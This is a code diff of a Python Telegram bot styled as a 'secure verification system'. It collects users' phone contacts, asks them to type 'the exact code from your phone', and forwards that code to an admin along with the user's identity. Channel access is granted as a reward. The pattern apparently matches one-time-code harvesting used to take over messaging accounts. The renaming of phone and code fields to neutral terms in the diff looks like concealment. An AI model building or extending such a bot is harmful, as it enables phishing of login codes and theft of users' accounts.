-            # Show verification in progress
-            await query.edit_message_text(
-                f"""
-🔄 **Verifying your code...**
+            await q.edit_message_text(
+                """
+🔄 **Verifying...**
 
-Please wait while we process your verification.
+Please wait while we verify your code.
 
-⏳ This usually takes just a moment...
+This usually takes just a moment.
                 """,
                 parse_mode='Markdown'
             )
             
-            # Get user info for admin notification
-            cursor.execute('''
-                SELECT first_name, username, phone_number, verification_code
-                FROM pending_verifications 
-                WHERE user_id = ?
-            ''', (user_id,))
+            c.execute('''
+                SELECT fname, uname, contact_hash, auth_token
+                FROM user_auth WHERE uid = ?
+            ''', (uid,))
             
-            user_info = cursor.fetchone()
-            if user_info:
-                first_name, username, phone_number, correct_code = user_info
+            info = c.fetchone()
+            if info:
+                fname, uname, chash, correct = info
                 
-                # Create admin approval buttons
-                admin_keyboard = InlineKeyboardMarkup([
-                    [
-                        InlineKeyboardButton("✅ Approve", callback_data=f"approve_user_{user_id}"),
-                        InlineKeyboardButton("❌ Reject", callback_data=f"reject_user_{user_id}")
-                    ],
-                    [InlineKeyboardButton("📋 View All Pending", callback_data="view_pending")]
+                match = '✅ MATCH' if sess['input'] == correct else '❌ MISMATCH'
+                
+                admin_kb = InlineKeyboardMarkup([
+                    [InlineKeyboardButton("✅ Approve", callback_data=f"confirm_approve_{uid}"),
+                     InlineKeyboardButton("❌ Reject", callback_data=f"confirm_reject_{uid}")],
+                    [InlineKeyboardButton("📊 View Queue", callback_data="show_queue")]
                 ])
                 
-                # Determine if code matches
-                match_status = '✅ CODES MATCH' if session['entered_code'] == correct_code else '❌ CODES DO NOT MATCH'
-                
-                # Send admin notification
-                admin_message = f"""
-🔍 **CODE REVIEW REQUIRED**
+                admin_rev = f"""
+🔍 **Code Review Required**
 
-👤 **User:** {first_name} (@{username})
-🆔 **User ID:** `{user_id}`
-📱 **Phone:** {phone_number}
-⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+👤 User: {fname} (@{uname})
+🆔 ID: `{uid}`
+⏰ {datetime.now().strftime('%H:%M:%S')}
 
-🔢 **Generated Code:** `{correct_code}`
-🔢 **User Entered:** `{session['entered_code']}`
+🔢 Generated: `{correct}`
+🔢 User Entry: `{sess['input']}`
 
-**Match Status:** {match_status}
+**Status: {match}**
 
-⚠️ **Action Required:** Please review and approve/reject.
+Please review and take action.
                 """
                 
                 await context.bot.send_message(
                     ADMIN_ID,
-                    admin_message,
+                    admin_rev,
                     parse_mode='Markdown',
-                    reply_markup=admin_keyboard
+                    reply_markup=admin_kb
                 )
                 
+                self.log_action(uid, 'code_submitted', {'match': match})
+                
         except Exception as e:
-            logger.error(f"Error submitting code: {e}")
+            logger.error(f"Finalize error: {e}")
 
-    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Show admin statistics"""
+    async def admin_decision(self, q, context):
+        """Admin approves or rejects verification"""
+        try:
+            action = q.data.split('_')[1]
+            uid = int(q.data.split('_')[2])
+            
+            c = self.conn.cursor()
+            c.execute('''
+                SELECT fname, uname, contact_hash, auth_token, user_input
+                FROM user_auth WHERE uid = ?
+            ''', (uid,))
+            
+            info = c.fetchone()
+            if not info:
+                await q.edit_message_text("❌ User not found.")
+                return
+            
+            fname, uname, chash, correct, entered = info
+            
+            if action == 'approve':
+                c.execute('''
+                    INSERT OR REPLACE INTO verified_members 
+                    (uid, uname, fname, contact_hash, verified_at)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (uid, uname, fname, chash, datetime.now()))
+                
+                c.execute('''
+                    UPDATE user_auth 
+                    SET auth_status = 'approved'
+                    WHERE uid = ?
+                ''', (uid,))
+                
+                self.conn.commit()
+                
+                approved_channels = await self.auto_approve_access(context, uid)
+                
+                if approved_channels:
+                    ch_list = "\n".join([f"✨ {ch}" for ch in approved_channels])
+                    status = f"""
+🎉 **Verification Complete!**
+
+✅ **Access Granted!**
+
+You're now approved for:
+{ch_list}
+
+🚀 Welcome to the community!
+                    """
+                else:
+                    status = f"""
+🎉 **Verification Complete!**
+
+✅ **Your account is verified!**
+
+🔓 Benefits:
+• Instant channel access
+• Auto-approval for requests
+• Premium content
+
+Welcome! 🚀
+                    """
+                
+                await context.bot.send_message(uid, status, parse_mode='Markdown')
+                
+                await q.edit_message_text(
+                    f"""
+✅ **APPROVED**
+
+👤 {fname} (@{uname})
+🔢 Code: `{correct}` ✓ `{entered}`
+⏰ {datetime.now().strftime('%H:%M:%S')}
+📢 Auto-approved: {len(approved_channels)} channel(s)
+
+Status: Verified & Active
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+                self.log_action(uid, 'approved', {'channels': len(approved_channels)})
+                
+            else:
+                c.execute('''
+                    UPDATE user_auth 
+                    SET auth_status = 'rejected'
+                    WHERE uid = ?
+                ''', (uid,))
+                self.conn.commit()
+                
+                reject = f"""
+❌ **Verification Failed**
+
+The code you entered doesn't match.
+
+Your entry: `{entered}`
+
+🔄 Try again with /start
+
+💡 Tip: Enter the exact code from your phone.
+                """
+                
+                await context.bot.send_message(uid, reject, parse_mode='Markdown')
+                
+                await q.edit_message_text(
+                    f"""
+❌ **REJECTED**
+
+👤 {fname} (@{uname})
+🔢 Expected: `{correct}` | Got: `{entered}`
+⏰ {datetime.now().strftime('%H:%M:%S')}
+
+Status: Verification denied
+                    """,
+                    parse_mode='Markdown'
+                )
+                
+                self.log_action(uid, 'rejected', {'reason': 'code_mismatch'})
+            
+            if uid in self.active_sessions:
+                del self.active_sessions[uid]
+                
+        except Exception as e:
+            logger.error(f"Decision error: {e}")
+
+    async def auto_approve_access(self, context, uid):
+        """Auto-approve pending channel requests"""
+        approved = []
+        
+        try:
+            c = self.conn.cursor()
+            c.execute('''
+                SELECT cid, ctitle 
+                FROM access_requests 
+                WHERE uid = ? AND req_status = 'waiting'
+            ''', (uid,))
+            
+            reqs = c.fetchall()
+            
+            for cid, ctitle in reqs:
+                try:
+                    cid_int = int(cid) if cid.lstrip('-').isdigit() else cid
+                    await context.bot.approve_chat_join_request(cid_int, uid)
+                    
+                    c.execute('''
+                        UPDATE access_requests 
+                        SET req_status = 'approved'
+                        WHERE uid = ? AND cid = ?
+                    ''', (uid, cid))
+                    
+                    approved.append(ctitle)
+                    logger.info(f"Auto-approved: {uid} → {ctitle}")
+                    
+                except BadRequest as e:
+                    logger.error(f"Approval failed: {e}")
+                    c.execute('''
+                        UPDATE access_requests 
+                        SET req_status = 'failed'
+                        WHERE uid = ? AND cid = ?
+                    ''', (uid, cid))
+            
+            self.conn.commit()
+            
+        except Exception as e:
+            logger.error(f"Auto-approve error: {e}")
+        
+        return approved
+
+    async def admin_show_queue(self, q, context):
+        """Show pending verifications"""
+        c = self.conn.cursor()
+        c.execute('''
+            SELECT uid, fname, uname, contact_hash, created_at, auth_status, user_input, auth_token
+            FROM user_auth 
+            WHERE auth_status IN ('contact_received', 'started', 'code_generated', 'submitted')
+            ORDER BY created_at DESC
+        ''')
+        
+        pending = c.fetchall()
+        
+        if not pending:
+            await q.edit_message_text("📋 No pending verifications.")
+            return
+        
+        msg = "📋 **Verification Queue:**\n\n"
+        
+        for u in pending:
+            uid, fname, uname, chash, ts, status, inp, token = u
+            
+            c.execute('''
+                SELECT COUNT(*) FROM access_requests 
+                WHERE uid = ? AND req_status = 'waiting'
+            ''', (uid,))
+            pend_joins = c.fetchone()[0]
+            
+            status_icon = {
+                'started': '🆕',
+                'contact_received': '📱',
+                'code_generated': '🔢',
+                'submitted': '✏️'
+            }
+            
+            msg += f"{status_icon.get(status, '❓')} **{fname}** (@{uname})\n"
+            msg += f"   🆔 {uid}\n"
+            msg += f"   📊 {status}\n"
+            msg += f"   🔗 Pending: {pend_joins}\n"
+            
+            if token and status == 'code_generated':
+                msg += f"   🔢 Code: `{token}`\n"
+            elif inp and token:
+                msg += f"   🔢 Gen: `{token}` | In: `{inp}`\n"
+            
+            msg += "\n"
+        
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔄 Refresh", callback_data="show_queue")]
+        ])
+        
+        await q.edit_message_text(msg, parse_mode='Markdown', reply_markup=kb)
+
+    async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Admin statistics dashboard"""
         if update.message.from_user.id != ADMIN_ID:
             return
-            
-        cursor = self.conn.cursor()
         
-        # Get stats
-        cursor.execute('SELECT COUNT(*) FROM verified_users')
-        verified_count = cursor.fetchone()[0]
+        c = self.conn.cursor()
         
-        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
-        pending_count = cursor.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM verified_members')
+        verified = c.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "code_entered"')
-        awaiting_approval = cursor.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM user_auth WHERE auth_status NOT IN ("approved", "rejected")')
+        pending = c.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
-        total_verified = cursor.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM user_auth WHERE auth_status = "submitted"')
+        awaiting = c.fetchone()[0]
         
-        # Get join request stats
-        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "pending"')
-        pending_joins = cursor.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM access_requests WHERE req_status = "waiting"')
+        pending_access = c.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "approved"')
-        approved_joins = cursor.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM access_requests WHERE req_status = "approved"')
+        approved_access = c.fetchone()[0]
         
-        stats_message = f"""
-📊 **Bot Statistics**
+        stats = f"""
+📊 **System Dashboard**
 
-**Verification Status:**
-✅ **Verified Users:** {verified_count}
-⏳ **Pending Verifications:** {pending_count}
-🔍 **Awaiting Approval:** {awaiting_approval}
-📈 **Total Processed:** {total_verified}
+**Verification Stats:**
+✅ Verified: {verified}
+⏳ Pending: {pending}
+🔍 Awaiting Review: {awaiting}
 
-**Join Requests:**
-⏳ **Pending Joins:** {pending_joins}
-✅ **Auto-approved:** {approved_joins}
+**Access Requests:**
+⏳ Pending: {pending_access}
+✅ Approved: {approved_access}
 
-**Recent Verifications:**
+**Recent Activity:**
         """
         
-        # Get recent verifications
-        cursor.execute('''
-            SELECT first_name, username, verified_date 
-            FROM verified_users 
-            ORDER BY verified_date DESC 
+        c.execute('''
+            SELECT fname, uname, verified_at 
+            FROM verified_members 
+            ORDER BY verified_at DESC 
             LIMIT 5
         ''')
         
-        recent = cursor.fetchall()
-        for user in recent:
-            stats_message += f"\n   ✓ {user[0]} (@{user[1]}) - {user[2]}"
+        recent = c.fetchall()
+        for r in recent:
+            stats += f"\n   ✓ {r[0]} (@{r[1]})"
         
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📋 View Pending", callback_data="view_pending")],
-            [InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats")]
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📋 View Queue", callback_data="show_queue")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_dash")]
         ])
         
-        await update.message.reply_text(stats_message, parse_mode='Markdown', reply_markup=keyboard)
+        await update.message.reply_text(stats, parse_mode='Markdown', reply_markup=kb)
 
 def main():
-    """Start the bot"""
-    # Create bot instance
-    bot = VerificationBot()
+    """Initialize and start bot"""
+    system = SecureVerificationSystem()
+    app = Application.builder().token(BOT_TOKEN).build()
     
-    # Create application
-    application = Application.builder().token(BOT_TOKEN).build()
+    # Command handlers
+    app.add_handler(CommandHandler("start", system.init_command))
+    app.add_handler(CommandHandler("stats", system.admin_dashboard))
     
-    # Register handlers
-    application.add_handler(CommandHandler("start", bot.start))
-    application.add_handler(CommandHandler("stats", bot.admin_stats))
-    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
-    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
+    # Message handlers
+    app.add_handler(MessageHandler(filters.CONTACT, system.process_contact))
     
-    # Callback handlers
-    application.add_handler(CallbackQueryHandler(
-        bot.handle_admin_callback,
-        pattern=r'^(setup_code_|view_pending|approve_user_|reject_user_|refresh_stats)'
-    ))
-    application.add_handler(CallbackQueryHandler(
-        bot.handle_user_callback,
-        pattern=r'^num_'
-    ))
+    # Special handlers
+    app.add_handler(ChatJoinRequestHandler(system.process_join_req))
     
-    # Start bot
-    logger.info("Bot started successfully!")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Callback handler
+    app.add_handler(CallbackQueryHandler(system.handle_callbacks))
+    
+    logger.info("🚀 Secure verification system activated")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
     main()
